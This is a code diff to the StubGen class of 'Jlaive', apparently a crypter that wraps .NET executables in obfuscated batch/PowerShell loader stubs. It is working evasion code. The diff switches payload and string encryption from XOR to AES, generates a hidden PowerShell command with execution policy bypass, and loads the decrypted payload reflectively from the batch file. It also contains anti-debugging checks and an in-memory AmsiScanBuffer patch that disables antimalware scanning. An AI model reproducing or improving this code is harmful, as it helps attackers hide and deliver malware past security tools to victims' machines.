@@ -1,4 +1,5 @@
 ﻿using System;
+using System.Security.Cryptography;
 using System.Text;
 
 using static Jlaive.Utils;
@@ -7,7 +8,7 @@ namespace Jlaive
 {
     public class StubGen
     {
-        public static string CreatePS(string xorkey, bool hidden, Random rng)
+        public static string CreatePS(byte[] key, byte[] iv, bool hidden, Random rng)
         {
             string varname = RandomString(6, rng);
             string varname2 = RandomString(6, rng);
@@ -15,24 +16,28 @@ namespace Jlaive
             string classname = RandomString(6, rng);
             string functionname = RandomString(6, rng);
             string functionname2 = RandomString(6, rng);
-            string srcclass = Convert.ToBase64String(Encoding.UTF8.GetBytes(@"using System.Text;using System.IO;using System.IO.Compression; public class " + classname + @" { public static byte[] " + functionname + @"(byte[] input, string key) { byte[] keyc = Encoding.UTF8.GetBytes(key); for (int i = 0; i < input.Length; i++) { input[i] = (byte)(input[i] ^ keyc[i % keyc.Length]); } return input; } public static byte[] " + functionname2 + @"(byte[] bytes) { MemoryStream msi = new MemoryStream(bytes); MemoryStream mso = new MemoryStream(); var gs = new GZipStream(msi, CompressionMode.Decompress); gs.CopyTo(mso); gs.Dispose(); msi.Dispose(); mso.Dispose(); return mso.ToArray(); } }"));
-            return $"pshell.exe -noprofile {(hidden ? "-windowstyle hidden" : string.Empty)} -executionpolicy bypass -command ${varname} = (Get-Content -path '%~f0' -raw).Split([Environment]::NewLine);${varname2} = ${varname}[${varname}.Length - 1];${srcvarname} = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{srcclass}'));Add-Type -TypeDefinition ${srcvarname};[System.Reflection.Assembly]::Load([{classname}]::{functionname2}([{classname}]::{functionname}([System.Convert]::FromBase64String(${varname2}), '{xorkey}'))).EntryPoint.Invoke($null, (, [string[]] ('%*')))";
+            string srcclass = Convert.ToBase64String(Encoding.UTF8.GetBytes(@"using System.Text;using System.IO;using System.IO.Compression;using System.Security.Cryptography; public class " + classname + @" { public static byte[] " + functionname + @"(byte[] input, byte[] key, byte[] iv) { AesManaged aes = new AesManaged(); aes.Mode = CipherMode.CBC; aes.Padding = PaddingMode.PKCS7; ICryptoTransform decryptor = aes.CreateDecryptor(key, iv); byte[] decrypted = decryptor.TransformFinalBlock(input, 0, input.Length); decryptor.Dispose(); aes.Dispose(); return decrypted; } public static byte[] " + functionname2 + @"(byte[] bytes) { MemoryStream msi = new MemoryStream(bytes); MemoryStream mso = new MemoryStream(); var gs = new GZipStream(msi, CompressionMode.Decompress); gs.CopyTo(mso); gs.Dispose(); msi.Dispose(); mso.Dispose(); return mso.ToArray(); } }"));
+            return $"pshell.exe -noprofile {(hidden ? "-windowstyle hidden" : string.Empty)} -executionpolicy bypass -command ${varname} = (Get-Content -path '%~f0' -raw).Split([Environment]::NewLine);${varname2} = ${varname}[${varname}.Length - 1];${srcvarname} = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{srcclass}'));Add-Type -TypeDefinition ${srcvarname};[System.Reflection.Assembly]::Load([{classname}]::{functionname2}([{classname}]::{functionname}([System.Convert]::FromBase64String(${varname2}), [System.Convert]::FromBase64String('{Convert.ToBase64String(key)}'), [System.Convert]::FromBase64String('{Convert.ToBase64String(iv)}')))).EntryPoint.Invoke($null, (, [string[]] ('%*')))";
         }
 
         public static string CreateCS(byte[] pbytes, bool bamsi, bool antidebug, Random rng)
         {
             string namespacename = RandomString(10, rng);
             string classname = RandomString(10, rng);
-            string xorfunction = RandomString(10, rng);
+            string aesfunction = RandomString(10, rng);
             string uncompressfunction = RandomString(10, rng);
             string virtualprotect = RandomString(10, rng);
             string checkremotedebugger = RandomString(10, rng);
             string isdebuggerpresent = RandomString(10, rng);
-            string key = RandomString(20, rng);
-            string encrypted = Convert.ToBase64String(XORCrypt(Compress(pbytes), key));
-            string amsiscanbuffer_str = Convert.ToBase64String(XORCrypt(Encoding.UTF8.GetBytes("AmsiScanBuffer"), key));
-            string checkremotedebugger_str = Convert.ToBase64String(XORCrypt(Encoding.UTF8.GetBytes("CheckRemoteDebuggerPresent"), key));
-            string isdebuggerpresent_str = Convert.ToBase64String(XORCrypt(Encoding.UTF8.GetBytes("IsDebuggerPresent"), key));
+
+            AesManaged aes = new AesManaged();
+            string encrypted = Convert.ToBase64String(Encrypt(Compress(pbytes), aes.Key, aes.IV));
+            string amsiscanbuffer_str = Convert.ToBase64String(Encrypt(Encoding.UTF8.GetBytes("AmsiScanBuffer"), aes.Key, aes.IV));
+            string checkremotedebugger_str = Convert.ToBase64String(Encrypt(Encoding.UTF8.GetBytes("CheckRemoteDebuggerPresent"), aes.Key, aes.IV));
+            string isdebuggerpresent_str = Convert.ToBase64String(Encrypt(Encoding.UTF8.GetBytes("IsDebuggerPresent"), aes.Key, aes.IV));
+            string key_str = Convert.ToBase64String(aes.Key);
+            string iv_str = Convert.ToBase64String(aes.IV);
+            aes.Dispose();
             return @"using System;
 using System.Diagnostics;
 using System.Text;
@@ -40,6 +45,7 @@ using System.Reflection;
 using System.Runtime.InteropServices;
 using System.IO;
 using System.IO.Compression;
+using System.Security.Cryptography;
 
 namespace " + namespacename + @"
 {
@@ -62,8 +68,8 @@ namespace " + namespacename + @"
             " + (antidebug || bamsi ? @"IntPtr kmodule = LoadLibrary(""k"" + ""e"" + ""r"" + ""n"" + ""e"" + ""l"" + ""3"" + ""2"" + ""."" + ""d"" + ""l"" + ""l"");" : string.Empty) + @"
 
             " + (antidebug ?
-@"IntPtr crdpaddr = GetProcAddress(kmodule, Encoding.UTF8.GetString(" + xorfunction + @"(Convert.FromBase64String(""" + checkremotedebugger_str + @"""), """ + key + @""")));
-IntPtr idpaddr = GetProcAddress(kmodule, Encoding.UTF8.GetString(" + xorfunction + @"(Convert.FromBase64String(""" + isdebuggerpresent_str + @"""), """ + key + @""")));
+@"IntPtr crdpaddr = GetProcAddress(kmodule, Encoding.UTF8.GetString(" + aesfunction + @"(Convert.FromBase64String(""" + checkremotedebugger_str + @"""), Convert.FromBase64String(""" + key_str + @"""), Convert.FromBase64String(""" + iv_str + @"""))));
+IntPtr idpaddr = GetProcAddress(kmodule, Encoding.UTF8.GetString(" + aesfunction + @"(Convert.FromBase64String(""" + isdebuggerpresent_str + @"""), Convert.FromBase64String(""" + key_str + @"""), Convert.FromBase64String(""" + iv_str + @"""))));
 " + checkremotedebugger + @" CheckRemoteDebuggerPresent = (" + checkremotedebugger + @")Marshal.GetDelegateForFunctionPointer(crdpaddr, typeof(" + checkremotedebugger + @"));
 " + isdebuggerpresent + @" IsDebuggerPresent = (" + isdebuggerpresent + @")Marshal.GetDelegateForFunctionPointer(idpaddr, typeof(" + isdebuggerpresent + @"));
 bool remotedebug = false;
@@ -74,7 +80,7 @@ if (Debugger.IsAttached || remotedebug || IsDebuggerPresent()) Environment.Exit(
             @"IntPtr vpaddr = GetProcAddress(kmodule, ""V"" + ""i"" + ""r"" + ""t"" + ""u"" + ""a"" + ""l"" + ""P"" + ""r"" + ""o"" + ""t"" + ""e"" + ""c"" + ""t"");
             " + virtualprotect + @" VirtualProtect = (" + virtualprotect + @")Marshal.GetDelegateForFunctionPointer(vpaddr, typeof(" + virtualprotect + @"));
             IntPtr amsimodule = LoadLibrary(""a"" + ""m"" + ""s"" + ""i"" + ""."" + ""d"" + ""l"" + ""l"");
-            IntPtr asbaddr = GetProcAddress(amsimodule, Encoding.UTF8.GetString(" + xorfunction + @"(Convert.FromBase64String(""" + amsiscanbuffer_str + @"""), """ + key + @""")));
+            IntPtr asbaddr = GetProcAddress(amsimodule, Encoding.UTF8.GetString(" + aesfunction + @"(Convert.FromBase64String(""" + amsiscanbuffer_str + @"""), Convert.FromBase64String(""" + key_str + @"""), Convert.FromBase64String(""" + iv_str + @"""))));
 
             byte[] patch;
             if (IntPtr.Size == 8) patch = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
@@ -84,19 +90,21 @@ if (Debugger.IsAttached || remotedebug || IsDebuggerPresent()) Environment.Exit(
             Marshal.Copy(patch, 0, asbaddr, patch.Length);
             VirtualProtect(asbaddr, (UIntPtr)patch.Length, old, out old);" : string.Empty) + @"
 
-            MethodInfo entry = Assembly.Load(" + uncompressfunction + @"(" + xorfunction + @"(Convert.FromBase64String(payload), """ + key + @"""))).EntryPoint;
+            MethodInfo entry = Assembly.Load(" + uncompressfunction + @"(" + aesfunction + @"(Convert.FromBase64String(payload), Convert.FromBase64String(""" + key_str + @"""), Convert.FromBase64String(""" + iv_str + @""")))).EntryPoint;
             try { entry.Invoke(null, new object[] { args[0].Split(' ') }); }
             catch { entry.Invoke(null, null); }
         }
 
-        static byte[] " + xorfunction + @"(byte[] input, string key)
+        static byte[] " + aesfunction + @"(byte[] input, byte[] key, byte[] iv)
         {
-            byte[] keyc = Encoding.UTF8.GetBytes(key);
-            for (int i = 0; i < input.Length; i++)
-            {
-                input[i] = (byte)(input[i] ^ keyc[i % keyc.Length]);
-            }
-            return input;
+            AesManaged aes = new AesManaged();
+            aes.Mode = CipherMode.CBC;
+            aes.Padding = PaddingMode.PKCS7;
+            ICryptoTransform decryptor = aes.CreateDecryptor(key, iv);
+            byte[] decrypted = decryptor.TransformFinalBlock(input, 0, input.Length);
+            decryptor.Dispose();
+            aes.Dispose();
+            return decrypted;
         }
 
         static byte[] " + uncompressfunction + @"(byte[] bytes)
